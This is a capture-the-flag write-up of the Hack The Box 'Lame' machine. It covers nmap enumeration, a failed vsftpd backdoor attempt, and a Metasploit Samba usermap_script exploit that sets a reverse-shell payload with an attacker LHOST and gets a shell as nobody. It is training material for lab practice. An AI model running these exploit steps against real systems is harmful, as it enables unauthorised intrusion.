# HTB - Lame 🐧
**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.10.10.3  
**Date Completed:** 2025-04-08  
**Author:** Sabin Shrestha

---

#📡 Enumeration
  1.🔍 Full TCP Port Scan with Nmap
    bash
      nmap -sC -sV -p- 10.10.10.3
    Output:
      PORT     STATE SERVICE     VERSION
      21/tcp   open  ftp         vsftpd 2.3.4
      22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
      139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
      445/tcp  open  microsoft-ds Samba smbd 3.0.20-Debian
  2.🔍 Service Analysis
  🔸 FTP (Port 21)
      -Service: vsFTPd 2.3.4
        Known for CVE-2011-2523, which opens a bind shell on port 6200 when a :) is used in the username.
      -Tried:
        Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor
          (Manual FTP login with user:)
          Result: No bind shell on port 6200 → likely patched or blocked.
  🔸 Samba (Ports 139 & 445)
  　  Service: Samba 3.0.20-Debian
      -Vulnerable to CVE-2007-2447 — user map script injection vulnerability.
      Used Metasploit:
        -use exploit/multi/samba/usermap_script
        -set RHOSTS 10.10.10.3
        -set PAYLOAD cmd/unix/reverse
        -set LHOST <attacker_IP>
        -run
        #Result: Successfully got a reverse shell as nobody.

  🔸 SSH (Port 22)
    -OpenSSH 4.7p1 was detected.
    #No credentials or exploits attempted — ignored for this challenge.

🧠 Summary
1.FTP looked exploitable but turned out to be a false positive – classic example of why banners alone aren’t enough.
2.Samba vulnerability provided a reliable foothold using a classic Metasploit module.
3.This foothold enabled post-exploitation and privilege escalation that followed.

💣 Initial Access
🎯 Exploit Used: Samba usermap_script (CVE-2007-2447)
1.After identifying that Samba 3.0.20-Debian was running on ports 139 and 445, I confirmed that it was vulnerable to the classic user map script command injection vulnerability.
2.I used Metasploit’s built-in module to exploit it and gain shell access:
  -use exploit/multi/samba/usermap_script
  -set RHOSTS 10.10.10.3
  -set PAYLOAD cmd/unix/reverse
  -set LHOST <your_IP>
  -run
  #Once executed, the target connected back with a reverse shell:
    whoami
    nobody
    #The shell dropped in as the nobody user, which is a low-privileged account typically used for guest or anonymous services.

🛠 Notes:
-The exploit works by abusing Samba's internal username map script feature, injecting arbitrary commands through a crafted username string.
-It’s a command injection, not a memory corruption — so it's reliable, especially on older systems.
-Nocredentials were needed — full unauthenticated remote code execution.

🔑 Outcome:
-Gained initial foothold on the system
  user: nobody
-Shell type: Reverse shell (Bash)

2. Privilege Escalation
    #not performed

3. 🧠 Takeaways
  1.Always try multiple exploitation paths — what looks obvious (FTP) may be a decoy.
  2.Use classic tools like nmap + linpeas.sh + Metasploit to rapidly identify and exploit older systems.
  3.Keep privilege escalation exploits handy for old kernels — they often work on legacy boxes like Lame.
